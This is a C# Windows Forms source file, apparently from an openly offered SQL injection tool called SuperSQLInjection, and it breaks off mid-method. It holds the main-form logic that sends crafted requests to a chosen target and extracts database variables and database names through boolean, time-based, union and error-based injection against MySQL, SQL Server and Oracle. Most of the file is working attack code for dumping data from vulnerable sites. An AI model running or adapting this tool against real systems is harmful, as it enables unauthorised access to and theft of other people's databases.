﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using tools;
using System.Threading;
using SuperSQLInjection.tools;
using model;
using SuperSQLInjection.model;
using SuperSQLInjection.payload;
using System.Diagnostics;
using System.Text.RegularExpressions;
using System.IO;
using System.Collections;
using SuperSQLInjection.scan;
using System.Web;
using System.Net;

namespace SuperSQLInjection
{
    public partial class Main : Form
    {
        public Main()
        {
            InitializeComponent();
            Control.CheckForIllegalCrossThreadCalls = false;
        }
        public ShowResponse sr = null;
        public Config config = new Config();//注入基础配置

        public String curren_db = "";//当前数据库
        public String curren_table = "";//当前表
        public static int status = 0;

        public int currentDbsCount = 0;
        public int currentTableCount = 0;
        public int currentDataCount = 0;
        public int dbsCount = 0;
        public int tableCount = 0;
        public int dataCount = 0;
        public int runTime = 0;
        public const String setInjectStr = "#inject#";
        public Dictionary<String, ServerInfo> serverinfo_list = new Dictionary<String, ServerInfo>();
        public Hashtable replaceList = new Hashtable();
        public HashSet<String> scan_list = new HashSet<String>();
        public int loadListStatus = 0;//注入双击导入扫描URL

        public static int comm_count = 0;//猜测的表数量

        public static int comm_currentCount = 0;//猜测的数量

        public int injectionURLCount = 0;//注入URL数

        delegate void showLogDelegate(String log);

        public void showLog(String log)
        {
            this.txt_log.AppendText(log + "\r\n");
        }

        public void sendRequestAndShowResponse()
        {
            if (this.sr != null)
            {
                this.sr.Close();
            }

            if (Thread.CurrentThread.Name == null)
            {
                Thread.CurrentThread.Name = "SendThread-";
            }
            ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, "", this.txt_inject_request.Text, config.timeOut, config.encoding, config.is_foward_302,config.redirectDoGet);
            if (server.timeout)
            {
                MessageBox.Show("连接超时！");
            }
            else
            {
                ShowResponse sr = new ShowResponse();
                sr.server = server;
                this.sr = sr;
                sr.ShowDialog();
            }

        }

        public void sendRequestAndShowResponseInvoke()
        {
            this.Invoke(new delegateVoid(sendRequestAndShowResponse));
        }

        delegate void delegateVoid();

        private void btn_inject_sendData_Click(object sender, EventArgs e)
        {
            if (checkSendDataConfig())
            {
                Thread t = new Thread(sendRequestAndShowResponseInvoke);
                t.Start();
            }
        }

        private void Main_Shown(object sender, EventArgs e)
        {
            //初始化配置

            this.cbox_basic_encoding.SelectedIndex = 0;
            this.cbox_basic_threadSize.SelectedIndex = 9;
            this.cbox_basic_timeOut.SelectedIndex = 4;
            this.cbox_basic_reTryCount.SelectedIndex = 1;
            this.data_dbs_cob_db_encoding.SelectedIndex = 0;
            this.file_cbox_readWrite.SelectedIndex = 0;
            this.bypass_cbox_sendHTTPSleepTime.SelectedIndex = 0;
            this.cbox_bypass_urlencode_count.SelectedIndex = 0;

            HTTP.main = this;
            //清空日志
            Thread t = new Thread(Tools.delHTTPLog);
            t.Start();
            try
            {
                this.config = XML.readConfig("lastConfig.xml");
                reloadConfig(this.config);
            }
            catch (Exception ex)
            {
                Tools.SysLog("加载配置发生错误！" + ex.Message);
            }
            this.Invoke(new StringDelegate(log), "自动加载上次配置成功！");
            InjectionTools.addErrorCode();
            //读取模板
            List<String> templates=FileTool.readAllDic("/config/template/");
            foreach (String templateName in templates)
            {
                this.bypass_cbox_loadTemplate.Items.Add(templateName);
            }
            if (config.isAutoCheckUpdate)
            {
                new Thread(checkUpdate).Start();
            }

        }
        public void HttpDownloadFile(string url, string path)
        {
            // 设置参数
            HttpWebRequest request = WebRequest.Create(url) as HttpWebRequest;

            //发送请求并获取相应回应数据
            HttpWebResponse response = request.GetResponse() as HttpWebResponse;
            //直到request.GetResponse()程序才开始向目标网页发送Post请求
            Stream responseStream = response.GetResponseStream();

            //创建本地文件写入流
            Stream stream = new FileStream(path, FileMode.Create);

            byte[] bArr = new byte[1024];
            int size = responseStream.Read(bArr, 0, (int)bArr.Length);
            while (size > 0)
            {
                stream.Write(bArr, 0, size);
                size = responseStream.Read(bArr, 0, (int)bArr.Length);
            }
            stream.Close();
            responseStream.Close();
        }

        public static int version = 20160525;
        public static String versionURL = "http://www.shack2.org/soft/SSuperSQLInjection/version.txt";
        //检查更新
        public void checkUpdate()
        {
            try
            {
                String[] result = HttpTools.getHtml(versionURL, 30).Split('-');
                String versionText = result[0];
                int cversion = int.Parse(result[1]);
                String versionUpdateURL = result[2];
                if (cversion > version)
                {
                    DialogResult dr = MessageBox.Show("发现新版本：" + versionText + "，更新日期：" + cversion + "，立即更新吗？", "提示", MessageBoxButtons.OKCancel);

                    if (DialogResult.OK.Equals(dr))
                    {
                        try
                        {
                            int index = versionUpdateURL.LastIndexOf("/");
                            String filename = "update.rar";
                            if (index != -1){
                                filename = versionUpdateURL.Substring(index);
                            }
                            HttpDownloadFile(versionUpdateURL, AppDomain.CurrentDomain.BaseDirectory + filename);
                            MessageBox.Show("更新成功，请将解压后运行！");
                        }

                        catch (Exception other)
                        {
                            MessageBox.Show("更新失败，请访问官网更新！" + other.GetBaseException());
                        }
                    }
                }
                else
                {

                    MessageBox.Show("自动检查更新，没有发现新版本！");
                }
            }
            catch (Exception e)
            {
                MessageBox.Show("未发现新版本！");
            }
        }

        /***
         * 检查配置是否完整
         * 
         * **/

        public Boolean checkConfig()
        {

            if ("".Equals(this.txt_basic_host.Text))
            {
                MessageBox.Show("描述没有填写目标地址！");
                return false;
            }

            config.domain = this.txt_basic_host.Text;

            try
            {
                config.port = int.Parse(this.txt_basic_port.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("把目标端口写上吧！");

                return false;
            }

            if (InjectType.UnKnow.Equals(config.injectType))
            {
                MessageBox.Show("注入类型还未设置，您可以人工设置或点击自动识别！");
                return false;
            }

            switch (this.cbox_basic_injectType.SelectedIndex)
            {
                case 0:
                    config.injectType = InjectType.UnKnow;
                    break;
                case 1:
                    config.injectType = InjectType.Bool;
                    break;
                case 2:
                    config.injectType = InjectType.Error;
                    break;
                case 3:
                    config.injectType = InjectType.Union;
                    break;
                case 4:
                    config.injectType = InjectType.Sleep;
                    break;
            }

            if (DBType.UnKnow.Equals(config.dbType))
            {
                MessageBox.Show("数据库类型还未设置，您可以人工设置或点击自动识别！");
                return false;
            }

            switch (this.cbox_basic_dbType.SelectedIndex)
            {
                case 0:
                    config.dbType = DBType.UnKnow;
                    break;
                case 1:
                    config.dbType = DBType.Access;
                    break;
                case 2:
                    config.dbType = DBType.MySQL5;
                    break;
                case 3:
                    config.dbType = DBType.SQLServer;
                    break;
                case 4:
                    config.dbType = DBType.Oracle;
                    break;
                case 5:
                    config.dbType = DBType.MySQL4;
                    break;
            }


            try
            {
                config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("每次请求多少时间？没响应我就放弃啦！");
                return false;
            }


            if ("".Equals(this.cbox_basic_encoding.Text))
            {
                MessageBox.Show("网页是啥编码呢？我不会去猜的，赶快告诉我！");
                return false;
            }
            config.encoding = this.cbox_basic_encoding.Text;

            try
            {
                config.threadSize = int.Parse(this.cbox_basic_threadSize.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("大侠，同时启动多少个线程呢！");
                return false;
            }

            try
            {
                config.reTry = int.Parse(this.cbox_basic_reTryCount.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("失败了不能放弃，我能试几次？");
                return false;
            }

            if (this.cbox_basic_injectType.SelectedIndex == 0 && this.txt_inject_key.Text == "")
            {
                MessageBox.Show("盲注需要设置关键字，这个关键字呢，就是正常时（and 1=1）存在的字符，而不正常时（and 1=2）不存在的字符！");
                return false;
            }

            if (this.cbox_basic_injectType.SelectedIndex == 1 && (this.txt_inject_unionColumnsCount.Text.Length <= 0 || this.txt_inject_showColumn.Text.Length <= 0))
            {
                MessageBox.Show("Union注入需要设置查询总列数和数据显示列！");
                return false;
            }

            config.key = this.txt_inject_key.Text;

            if (this.txt_inject_request.Text == "")
            {
                MessageBox.Show("没有设置数据包！");
                return false;
            }

            config.request = this.txt_inject_request.Text;
            //设置线程池控制
            ThreadPool.SetMinThreads(config.threadSize, config.threadSize);
            MyThreadPool.maxThread = config.threadSize;
            return true;

        }

        public Boolean checkSendDataConfig()
        {
            if ("".Equals(this.txt_inject_request.Text))
            {
                MessageBox.Show("没有数据包！");
                return false;
            }

            if ("".Equals(this.txt_basic_host.Text))
            {
                MessageBox.Show("描述没有填写目标地址！");
                return false;
            }

            config.domain = this.txt_basic_host.Text;

            try
            {
                config.port = int.Parse(this.txt_basic_port.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("把目标端口写上吧！");
                return false;
            }

            try
            {
                config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("每次请求多少时间？没响应我就放弃啦！");
                return false;
            }


            if ("".Equals(this.cbox_basic_encoding.Text))
            {
                MessageBox.Show("网页是啥编码呢？我不会去猜的，赶快告诉我！");
                return false;
            }
            config.encoding = this.cbox_basic_encoding.Text;

            try
            {
                config.threadSize = int.Parse(this.cbox_basic_threadSize.Text);
            }
            catch (Exception e)
            {
                MessageBox.Show("每次请求多少时间？没响应我就放弃啦！");
                return false;
            }
            config.is_foward_302 = this.chk_inject_foward_302.Checked;
            return true;

        }
        public void getVariablesBySleep(DBType dbType)
        {




        }
        /// <summary>
        /// 获得union获得error注入的获得的数据内容
        /// </summary>
        /// <param name="opayload"></param>
        /// <returns></returns>
        public String getOneDataByUnionOrError(String opayload)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式^^!col$$$col!^^
                    Match m = Regex.Match(server.body, "(?<=(\\^\\^\\!))[.\\s\\S]*?(?=(\\!\\^\\^))");
                    if (m.Success)
                    {
                        return m.Value;
                    }
                }
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "发生异常：" + e.Message);

            }
            return "";
        }



        /// <summary>
        /// 获得union error注入的获得的hex数据内容
        /// </summary>
        /// <param name="opayload"></param>
        /// <returns></returns>
        public String getOneHexDataByUnionOrError(String opayload)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302,config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式
                    Match m = Regex.Match(server.body, "(?<=(\\-\\-\\:))[.\\s\\S]*?(?=(\\:\\-\\-))");
                    if (m.Success)
                    {
                        return Tools.unHex(m.Value, config.db_encoding);
                    }
                }
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "发生异常：" + e.Message);

            }
            return "";
        }

        public String getOneHexNoUnHexDataByUnionOrError(String opayload)
        {

            try
            {
                ServerInfo server = HTTP.sendRequestRetry(config.useSSL, config.reTry, config.domain, config.port, opayload.ToString(), config.request, config.timeOut, config.encoding, config.is_foward_302, config.redirectDoGet);

                if (server.body != null && server.body.Length > 0)
                {
                    //查找格式
                    Match m = Regex.Match(server.body, "(?<=(\\-\\-\\:))[.\\s\\S]*?(?=(\\:\\-\\-))");
                    if (m.Success)
                    {
                        return m.Value;
                    }
                }
            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "发生异常：" + e.Message);

            }
            return "";
        }


        public void getVariablesByUnionByMySQL5(Object v)
        {
            if (status == 0)
            {

                Thread.CurrentThread.Abort();
            }
            String[] sv = v.ToString().Split(':');
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String columns = MySQL5.creatMySQLColumnsStrByUnion(config.columnsCount, config.showColumn, "1", column_list, null, null, -1);
            String pay_load = MySQL5.union_value.Replace("{data}", columns);
            String result = getOneDataByUnionOrError(pay_load);
            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
        }

        public void getVariablesByUnionBySQLServer(Object v)
        {

            String[] sv = v.ToString().Split(':');
            String pay_load = MSSQL.getUnionDataValue(config.columnsCount, config.showColumn, 1, sv[1]);
            String result = getOneDataByUnionOrError(pay_load);
            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
        }

        public void getVariablesByUnionByOracle(Object v)
        {

            String[] sv = v.ToString().Split(':');
            String pay_load = Oracle.getUnionDataValue(config.columnsCount, config.showColumn, sv[1], "", "", "");
            String result = getOneDataByUnionOrError(pay_load);
            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);
        }

        public void getVariablesByErrorByMySQL5(Object v)
        {
            String[] sv = v.ToString().Split(':');
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String columns = MySQL5.creatMySQLColumnsStrByError(column_list, null, null, -1);
            String pay_load = MySQL5.error_value.Replace("{data}", columns);
            String result = getOneDataByUnionOrError(pay_load);
            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);

        }

        public void getVariablesByErrorBySQLServer(Object v)
        {
            String[] sv = v.ToString().Split(':');
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String pay_load = MSSQL.error_value.Replace("{data}", sv[1]);
            String result = getOneDataByUnionOrError(pay_load);
            //错误显示会HTML编码，所以需要HTML解码
            result = HttpUtility.HtmlDecode(result);
            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);

        }

        public void getVariablesByErrorByOracle(Object v)
        {
            String[] sv = v.ToString().Split(':');
            List<String> column_list = new List<String>();
            column_list.Add(sv[1]);
            String pay_load = Oracle.getErrorDataValue(sv[1], "", "", "");
            String result = getOneHexDataByUnionOrError(pay_load);
            this.Invoke(new setVariableDelegate(setVariable), sv[0], result);

        }

        //立即结束线程池
        private void StopThread()
        {
            status = -1;
            if (this.currentThread != null)
            {
                this.currentThread.Abort();
            }
            status = 0;
        }

        public void getVariablesByUnion(DBType dbType)
        {
            switch (dbType)
            {

                case DBType.Access:
                    MessageBox.Show("报告大侠，Access数据库不支持此功能！");
                    break;
                case DBType.MySQL4: break;
                case DBType.MySQL5:
                    this.dataCount = MySQL5.vers.Count;
                    if (MySQL5.vers != null && MySQL5.vers.Count > 0)
                    {
                        for (int j = 0; j < MySQL5.vers.Count; j++)
                        {
                            String v = MySQL5.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariablesByUnionByMySQL5), v);
                            this.currentDataCount = j + 1;
                        }

                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
                    }
                    break;
                case DBType.SQLServer:
                    this.dataCount = MSSQL.vers.Count;
                    if (MSSQL.vers != null && MSSQL.vers.Count > 0)
                    {
                        for (int j = 0; j < MSSQL.vers.Count; j++)
                        {
                            String v = MSSQL.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariablesByUnionBySQLServer), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
                    }
                    break;
                case DBType.Oracle:
                    this.dataCount = Oracle.vers.Count;
                    if (Oracle.vers != null && Oracle.vers.Count > 0)
                    {
                        for (int j = 0; j < Oracle.vers.Count; j++)
                        {
                            String v = Oracle.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariablesByUnionByOracle), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
                    }
                    break;
            }

        }
        public void getVariablesByError(DBType dbType)
        {
            switch (dbType)
            {

                case DBType.Access:
                    MessageBox.Show("抱歉，Access数据库不支持错误显示方式注入！");
                    break;

                case DBType.MySQL4:
                    MessageBox.Show("抱歉，MySQL4以下版本不支持错误显示方式注入！");
                    break;
                case DBType.MySQL5:
                    this.dataCount = MySQL5.vers.Count;
                    if (MySQL5.vers != null && MySQL5.vers.Count > 0)
                    {
                        for (int j = 0; j < MySQL5.vers.Count; j++)
                        {
                            String v = MySQL5.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariablesByErrorByMySQL5), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
                    }
                    break;
                case DBType.SQLServer:
                    this.dataCount = MSSQL.vers.Count;
                    if (MSSQL.vers != null && MSSQL.vers.Count > 0)
                    {
                        for (int j = 0; j < MSSQL.vers.Count; j++)
                        {
                            String v = MSSQL.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariablesByErrorBySQLServer), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
                    }
                    break;
                case DBType.Oracle:
                    this.dataCount = Oracle.vers.Count;
                    if (Oracle.vers != null && Oracle.vers.Count > 0)
                    {
                        for (int j = 0; j < Oracle.vers.Count; j++)
                        {
                            String v = Oracle.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariablesByErrorByOracle), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
                    }
                    break;
            }

        }

        public void getVariablesByBool(DBType dbType)
        {

            switch (dbType)
            {

                case DBType.Access:
                    MessageBox.Show("报告大侠，Access数据库不支持此功能！");
                    break;
                case DBType.MySQL4:

                    break;
                case DBType.MySQL5:
                    this.dataCount = MySQL5.vers.Count;
                    if (MySQL5.vers != null && MySQL5.vers.Count > 0)
                    {
                        for (int j = 0; j < MySQL5.vers.Count; j++)
                        {
                            String v = MySQL5.vers[j];
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariableByBoolByMySQL), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/mysql5/vers.txt是否存在！");
                    }
                    break;
                case DBType.SQLServer:
                    this.dataCount = MSSQL.vers.Count;
                    if (MSSQL.vers != null && MSSQL.vers.Count > 0)
                    {
                        for (int j = 0; j < MSSQL.vers.Count; j++)
                        {
                            String v = MSSQL.vers[j];
                            //获取对应环境变量值
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariableByBoolBySQLServer), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
                    }
                    break;
                case DBType.Oracle:
                    this.dataCount = Oracle.vers.Count;
                    if (Oracle.vers != null && Oracle.vers.Count > 0)
                    {
                        for (int j = 0; j < Oracle.vers.Count; j++)
                        {
                            String v = Oracle.vers[j];
                            MyThreadPool.initThread(new ParameterizedThreadStart(getVariableByBoolByOracle), v);
                            this.currentDataCount = j + 1;
                        }
                    }
                    else
                    {
                        MessageBox.Show("没有读到相关数据库的环境变量文件，请检查配置文件:config/sqlserver/vers.txt是否存在！");
                    }

                    break;
            }
        }

        /**
         获取环境变量
         */
        public void getVers()
        {
            //获取环境变量
            this.data_lvw_ver.Items.Clear();
            //检查注入配置
            if (checkConfig())
            {
                //判断是否标记注入点
                if (isSetInjectPoint())
                {
                    switch (config.injectType)
                    {
                        case InjectType.Bool:
                            getVariablesByBool(config.dbType);
                            break;

                        case InjectType.Union:
                            getVariablesByUnion(config.dbType);
                            break;
                        case InjectType.Error:
                            getVariablesByError(config.dbType);
                            break;
                        case InjectType.Sleep:
                            getVariablesByBool(config.dbType);
                            break;
                    }

                }

            }

        }
        public Thread currentThread = null;
        private void data_cms_tsmi_getVariable_Click(object sender, EventArgs e)
        {
            if (MyThreadPool.GetAliveThreadsCount() == 0)
            {
                status = 1;
                currentThread = new Thread(getVers);
                currentThread.Start();
            }
            else
            {

                MessageBox.Show("还有线程未结束，请稍后...");
            }
        }

        public delegate void setVariableDelegate(String name, String value);
        public void setVariable(String name, String value)
        {
            ListViewItem lvi = new ListViewItem(name);

            lvi.SubItems.Add(value);
            this.data_lvw_ver.Items.Add(lvi);
        }

        /// <summary>
        /// 获取环境变量mysql bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByMySQL(Object vers)
        {
            /*
            if (config.keyType.Equals(KeyType.Time)) {
                getVariableByBoolByMySQLSleep(vers);
            }*/
            try
            {
                String[] vs = vers.ToString().Split(':');

                String payload_len = MySQL5.ver_length.Replace("{data}", vs[1]);
                if (config.keyType.Equals(KeyType.Time))
                {
                    payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length, config.maxTime).Replace("{data}", vs[1]);
                }

                int len = getValueByStepUp(payload_len,0, 10);
                this.Invoke(new StringDelegate(log), vs[0] + "长度为-----：" + len);

                String va_payload = MySQL5.ver_value.Replace("{data}", vs[1]);
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value, config.maxTime).Replace("{data}", vs[1]);
                }

                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    /*
                    String plen = null;
                    //是否判断多字节字符
                    Boolean pLen_isMax = false;
                    if ("1".Equals(vs[4]))
                    {
                        //开启多字节判断
                        //转换对应值判断是否多字节字符
                        plen = MySQL5.ver_length.Replace("data", MySQL5.mu_value.Replace("{data}", vs[1]).Replace("{index}", i + ""));
                        pLen_isMax = findKeyInBody(plen, 2);
                    }

                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    //多字节字符
                    if (pLen_isMax)
                    {
                        //MySQL采用hex
                        int mu_payload_len = getValue(plen, 2, 8);
                        int m_index = 0;
                        String[] ver_tmp = new String[mu_payload_len];
                        while (m_index < mu_payload_len)
                        {
                            //获取多字节
                            int ascii = getValue(tmp_va_payload, 0, 128);
                            ver_tmp[m_index] = ((char)ascii).ToString();
                            m_index++;
                        }
                        //设置值,这里由于是hex值，需要转换
                        value += Tools.unHex(Tools.convertToString(ver_tmp), config.db_encoding);
                    }
                    //单字节字符
                    else
                    {
                        int ascii = getValue(tmp_va_payload, 0, 255);
                        value += ((char)ascii).ToString();
                    }*/
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 255);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), vs[0] + "值为-----：" + value);
                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }

        }

        public void getVariableByBoolByMySQLSleep(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(':');

                String payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length, config.maxTime).Replace("{data}", vs[1]);

                int len = getValueByStepUp(payload_len, 0, 10);
                this.Invoke(new StringDelegate(log), vs[0] + "长度为-----：" + len);
                String va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value, config.maxTime).Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    /*此处忽略有中文的情况，这样可以提高速度
                    String plen = null;
                    //是否判断多字节字符
                    Boolean pLen_isMax = false;
                    if ("1".Equals(vs[4]))
                    {
                        //开启多字节判断
                        //转换对应值判断是否多字节字符
                        plen = MySQL5.ver_length.Replace("data", MySQL5.mu_value.Replace("{data}", vs[1]).Replace("{index}", i + ""));
                        pLen_isMax = findKeyInBody(plen, 2);
                    }

                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    //多字节字符
                    if (pLen_isMax)
                    {
                        //MySQL采用hex
                        int mu_payload_len = getValue(plen, 2, 8);
                        int m_index = 0;
                        String[] ver_tmp = new String[mu_payload_len];
                        while (m_index < mu_payload_len)
                        {
                            //获取多字节
                            int ascii = getValue(tmp_va_payload, 0, 128);
                            ver_tmp[m_index] = ((char)ascii).ToString();
                            m_index++;
                        }
                        //设置值,这里由于是hex值，需要转换
                        value += Tools.unHex(Tools.convertToString(ver_tmp), config.db_encoding);
                    }
                    //单字节字符
                    else
                    {
                        int ascii = getValue(tmp_va_payload, 0, 255);
                        value += ((char)ascii).ToString();
                    }*/
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 255);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), vs[0] + "值为-----：" + value);
                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }

        }


        /// <summary>
        /// 获取环境变量sqlserver bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolBySQLServer(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(':');
                //判断变量长度
                int len = getValueByStepUp(MSSQL.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.Invoke(new StringDelegate(log), vs[0] + "长度为-----：" + len);

                String va_payload = MSSQL.bool_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {

                    //select UNICODE(substring(@@version,{index},1))
                    //取值payload，替换对应下标值
                    String unicode_data_payload = MSSQL.unicode_value.Replace("{index}", i + "").Replace("{data}", vs[1] + "");
                    //取unicode转换后的长度
                    String unicode_data_len_payload = MSSQL.bool_length.Replace("{data}", unicode_data_payload);

                    //长度范围2-8支持大部分语言
                    int unicode_data_len = getValue(unicode_data_len_payload, 1, 8);
                    int m_index = 1;
                    StringBuilder unicodes = new StringBuilder();
                    while (m_index <= unicode_data_len)
                    {
                        //获取多字节
                        String substr_payload = MSSQL.substr.Replace("{data}", unicode_data_payload).Replace("{index}", m_index.ToString());
                        //单个unicode值范围是0-9
                        int unicode = getValue(MSSQL.bool_value.Replace("{data}", substr_payload), 0, 9);
                        unicodes.Append(unicode.ToString());
                        m_index++;
                    }

                    value += Tools.unHexByUnicode(int.Parse(unicodes.ToString()), config.db_encoding);
                    //设置值,这里由于是unicode值，需要转换
                    //String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    //int ascii = getValue(tmp_va_payload, 0, 255);  
                }
                this.Invoke(new StringDelegate(log), vs[0] + "值为-----：" + value);
                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }


        /// <summary>
        /// 获取环境变量oracle bool
        /// </summary>
        /// <param name="vers"></param>
        public void getVariableByBoolByOracle(Object vers)
        {
            try
            {
                String[] vs = vers.ToString().Split(':');
                //判断变量长度
                int len = getValueByStepUp(Oracle.bool_length.Replace("{data}", vs[1]), 0, 10);
                this.Invoke(new StringDelegate(log), vs[0] + "长度为-----：" + len);

                String va_payload = Oracle.bool_value.Replace("{data}", vs[1]);
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    String dp = va_payload.Replace("{index}", i.ToString());
                    int ascii = getValue(dp, 0, 255);
                    value += (char)ascii;
                }
                this.Invoke(new StringDelegate(log), vs[0] + "值为-----：" + value);
                this.Invoke(new setVariableDelegate(setVariable), vs[0], value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取值发生异常：" + e.Message);
            }
        }

        delegate void addItemToListViewDelegate(ListViewItem item);

        public void addItemToListView(ListViewItem item)
        {
            this.data_dbs_lvw_data.Items.Add(item);
        }

        delegate void addItemToListViewByColumnsDelegate(String colvs);
        public void addItemToListViewByColumns(String colvs)
        {
            String[] colv = Regex.Split(colvs, "\\$\\$\\$");
            ListViewItem lvi = null;
            for (int i = 0; i < colv.Length; i++)
            {
                if (lvi == null)
                {
                    lvi = new ListViewItem(colv[i]);
                }
                else
                {

                    lvi.SubItems.Add(colv[i]);
                }
            }
            this.data_dbs_lvw_data.Items.Add(lvi);
        }

        /// <summary>
        /// 获取数据库名称
        /// </summary>
        /// <param name="oindex">下标limit</param>
        public void getDBNameByBoolByMySQL(Object oindex)
        {
            try
            {
                int db_index = int.Parse(oindex.ToString());
                //判断对应下标的数据库长度
                String payload_len = MySQL5.ver_length.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString()));
                if (config.keyType.Equals(KeyType.Time))
                {
                    payload_len = MySQL5.getBoolCountBySleep(MySQL5.bool_length.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                }


                //判断当前数据库长度限制1-50
                int len = getValue(payload_len, 1, 50);
                this.Invoke(new StringDelegate(log), "数据库" + (db_index + 1) + "长度为-----：" + len);

                //判断当前数据库对应的ascii码
                String va_payload = MySQL5.ver_value.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString()));
                if (config.keyType.Equals(KeyType.Time))
                {
                    va_payload = MySQL5.getBoolCountBySleep(MySQL5.bool_value.Replace("{data}", MySQL5.db_value.Replace("{index}", oindex.ToString())), config.maxTime);
                }
                String value = "";
                //获取值
                for (int i = 1; i <= len; i++)
                {
                    if (status != 1)
                    {
                        break;
                    }
                    //取值payload，替换对应下标值
                    String tmp_va_payload = va_payload.Replace("{index}", i + "");
                    int ascii = getValue(tmp_va_payload, 0, 128);
                    value += ((char)ascii).ToString();
                }
                this.Invoke(new StringDelegate(log), "数据库" + db_index + "的名称为：" + value);
                this.Invoke(new addDBToTreeListDelegate(addDBToTreeList), value);

            }
            catch (Exception e)
            {

                this.Invoke(new StringDelegate(log), "获取数据库名称时发生异常：" + e.Message);
